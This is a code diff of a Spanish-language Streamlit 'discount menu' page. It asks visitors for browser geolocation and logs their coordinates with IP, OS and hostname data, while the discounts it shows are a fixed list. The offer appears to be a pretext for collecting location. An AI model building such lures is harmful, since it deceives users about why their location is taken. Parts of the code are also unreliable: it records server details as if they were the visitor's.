@@ -5,120 +5,101 @@ import requests
 import platform
 import socket
 from datetime import datetime
-from utils import guardar_datos  # tu función para guardar info
+from utils import guardar_datos
 
 st.set_page_config(page_title="Carta con Descuentos", layout="centered")
 
 st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
 st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")
 
-# Crea un componente custom para obtener la ubicación
-def get_location():
-    location = components.declare_component(
-        "get_location",
-        default=None,
-    )
+# Botón para iniciar petición de ubicación
+if "location_granted" not in st.session_state:
+    st.session_state.location_granted = False
 
-    if location is None:
-        # Primer render, insertamos JS para pedir ubicación
+if not st.session_state.location_granted:
+    if st.button("Permitir acceso a la ubicación"):
+        # Inyectar JS para pedir ubicación y setear query params
         components.html(
             """
             <script>
-            const sendLocation = () => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                  const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude};
-                  window.parent.postMessage({isLocation: true, coords: coords}, "*");
-                },
-                (err) => {
-                  window.parent.postMessage({isLocation: true, error: err.message}, "*");
-                }
-              );
-            };
-            sendLocation();
+            navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                const coords = {
+                  lat: pos.coords.latitude,
+                  lon: pos.coords.longitude
+                };
+                const coordsStr = JSON.stringify(coords);
+                window.parent.postMessage({type: 'geodata', data: coordsStr}, "*");
+              },
+              (err) => {
+                window.parent.postMessage({type: 'geodata', data: JSON.stringify({error: err.message})}, "*");
+              }
+            );
             </script>
             """,
             height=0,
         )
-    return location
-
-# Escuchar mensajes desde JS usando st.experimental_get_query_params no funciona,
-# pero Streamlit no soporta capturar postMessage nativamente,
-# por eso usaremos el componente declarado que puede devolver info a Python
-# cuando use window.parent.postMessage y el componente se llama get_location
-
-# Alternativa directa con declare_component es que se usa con React + JS, pero
-# sin archivo JS es muy limitada. Por eso usamos la siguiente forma simple:
-
-# En su lugar, vamos a usar components.html con un pequeño hack:
-# En cada ejecución, la función components.html() puede devolver texto usando window.prompt
-
-# Pero prompt no es práctico, mejor:
-# Vamos a usar el siguiente método: con un botón, pedimos la ubicación y la pasamos a un input text que Streamlit lee
-
-# Paso 1: Mostrar botón para pedir ubicación con JS que llena un campo oculto
-if "coords" not in st.session_state:
-    st.session_state.coords = None
-
-clicked = st.button("Permitir acceso a la ubicación")
-
-if clicked:
-    # Lanzar el JS para pedir la ubicación y guardarla en un input oculto
-    components.html(
-        """
-        <script>
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            const coords = position.coords.latitude + "," + position.coords.longitude;
-            // Colocar coords en input hidden que Streamlit puede leer
-            const input = window.parent.document.querySelector('input#coords_input');
-            if(input){
-              input.value = coords;
-              input.dispatchEvent(new Event('change'));
-            }
-          },
-          function(error) {
-            alert("Error al obtener la ubicación: " + error.message);
-          }
-        );
-        </script>
-        """,
-        height=0,
-    )
-
-# Paso 2: input text oculto para recibir coords desde JS
-coords = st.text_input("Coords", key="coords_input", value="", label_visibility="hidden")
-
-# Si coords ha cambiado, actualizar st.session_state.coords
-if coords and coords != st.session_state.coords:
-    st.session_state.coords = coords
-
-if st.session_state.coords:
-    try:
-        lat_str, lon_str = st.session_state.coords.split(",")
-        lat = float(lat_str)
-        lon = float(lon_str)
-        st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
-        st.subheader("Descuentos cercanos para ti:")
-        st.markdown("""
-        - 🍕 Pizza Margarita -20%
-        - 🍣 Sushi Deluxe -15%
-        - 🥗 Ensalada Mediterránea -10%
-        """)
-
-        # Registrar datos
-        user_data = {
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "lat": lat,
-            "lon": lon,
-            "ip": requests.get("https://api.ipify.org").text,
-            "browser": "N/A",  # No hay forma directa en Streamlit para user_agent sin librerías extra
-            "os": platform.system(),
-            "hostname": socket.gethostname()
-        }
-        guardar_datos(user_data)
-    except Exception as e:
-        st.error(f"Error al interpretar coordenadas: {e}")
 else:
-    st.warning("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")
+    st.success("¡Ya tienes acceso a la ubicación!")
 
+# Escuchar mensaje de JS con la ubicación
+# Para eso, ponemos un componente HTML que escucha window.postMessage
+# y usa window.location.search para enviar datos a Python vía query params
+
+components.html(
+    """
+    <script>
+    window.addEventListener("message", (event) => {
+        if(event.data.type === 'geodata'){
+            const geodata = event.data.data;
+            const url = new URL(window.location);
+            url.searchParams.set('geodata', geodata);
+            window.history.replaceState(null, null, url);
+            // Para forzar refresco y que Python vea el cambio
+            window.location.reload();
+        }
+    });
+    </script>
+    """,
+    height=0,
+)
+
+# Leer parámetros de consulta para obtener ubicación
+query_params = st.experimental_get_query_params()
+lat, lon = None, None
+if "geodata" in query_params:
+    try:
+        geo_data = json.loads(query_params["geodata"][0])
+        if "error" in geo_data:
+            st.error(f"Error al obtener ubicación: {geo_data['error']}")
+        else:
+            lat, lon = geo_data.get("lat"), geo_data.get("lon")
+            st.session_state.location_granted = True
+    except Exception as e:
+        st.error(f"Error procesando datos de ubicación: {e}")
+
+if lat is not None and lon is not None:
+    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
+    st.subheader("Descuentos cercanos para ti:")
+    st.markdown("""
+    - 🍕 Pizza Margarita -20%
+    - 🍣 Sushi Deluxe -15%
+    - 🥗 Ensalada Mediterránea -10%
+    """)
+
+    # Guardar datos
+    user_data = {
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "lat": lat,
+        "lon": lon,
+        "ip": requests.get("https://api.ipify.org").text,
+        "browser": "N/A",  # No se puede obtener directamente en Streamlit sin librerías extras
+        "os": platform.system(),
+        "hostname": socket.gethostname()
+    }
+    guardar_datos(user_data)
+else:
+    if st.session_state.location_granted:
+        st.warning("No se pudo obtener tu ubicación. Por favor, permite el acceso en el navegador.")
+    else:
+        st.info("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")
